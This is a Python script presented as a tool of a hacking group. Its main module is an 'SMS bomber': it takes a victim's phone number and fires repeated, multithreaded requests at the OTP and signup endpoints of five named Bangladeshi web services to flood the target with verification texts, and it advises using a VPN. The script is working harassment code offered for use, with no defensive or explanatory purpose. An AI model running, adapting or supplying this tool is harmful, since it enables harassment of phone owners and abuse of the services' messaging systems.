import os, sys, time, requests, random
from concurrent.futures import ThreadPoolExecutor

# --- Color Setup ---
G = '\033[32m'; R = '\033[31m'; Y = '\033[33m'; C = '\033[36m'; W = '\033[0m'

def banner():
    os.system('clear')
    print(f"""{R}
    ____  ___    ___     ____  ____  ___ 
   / __ \/   |  /   |   / __ \/ __ \/   |
  / /_/ / /| | / /| |  / /_/ / /_/ / /| |
 / _, _/ ___ |/ ___ | / _, _/ _, _/ ___ |
/_/ |_/_/  |_/_/  |_|/_/ |_/_/ |_/_/  |_|
{C}================================================
{G} [+] FOUNDER : {W}Sabid Sarker
{G} [+] TEAM    : {R}Rooted Anonymous Army (RAA)
{G} [+] VERSION : {Y}God-Mode v17.0 (Fixed & English)
{C}================================================{W}""")

def mega_bomber():
    banner()
    print(f"{C}--- SMS ATTACK MODULE ---{W}")
    num = input(f"{G}[+] Enter Target Number (01xxx): {W}") #
    if num.startswith("88"): target = num[2:]
    elif num.startswith("0"): target = num[1:]
    else: target = num
    clean_num = "0" + target 
    try:
        limit = int(input(f"{G}[+] SMS Attack Limit: {W}")) #
    except: limit = 10

    def fire(i):
        try:
            requests.get(f"https://bikroy.com/data/phone_number_login/verifications/phones/{clean_num}", timeout=5) #
            requests.post("https://web.shajgoj.com/api/v2/auth/otp/send", data={"mobile": clean_num}, timeout=5) #
            requests.get(f"https://www.osudpotro.com/api/v1/users/send-otp?phone={clean_num}", timeout=5) #
            requests.post("https://api.redx.com.bd/v1/user/signup", json={"phone": clean_num, "name": "RAA-USER"}, timeout=5)
            requests.post("https://api.paperfly.com.bd/api/v1/customer-registration-otp", data={"phone": clean_num}, timeout=5)
            print(f"\r{G}[✔] ATTACK SENT TO {clean_num} | STATUS: SUCCESS {i+1}", end="") #
        except: pass

    print(f"\n{Y}[*] Bombing In Progress... (Use VPN if it gets slow){W}") #
    with ThreadPoolExecutor(max_workers=50) as executor: #
        for i in range(limit): executor.submit(fire, i)
    input(f"\n\n{G}[+] Attack Finished! Press Enter.{W}")

def main():
    while True:
        banner()
        print(f" {C}[01]{W} Facebook Recon")
        print(f" {C}[02]{W} Mega SMS Bomber (English Fixed)")
        print(f" {C}[00]{W} Exit System")
        choice = input(f"\n{C}[RAA-Shell]:~# {W}") #
        if choice in ['2', '02']: mega_bomber()
        elif choice in ['0', '00']: sys.exit()

if __name__ == "__main__":
    main()

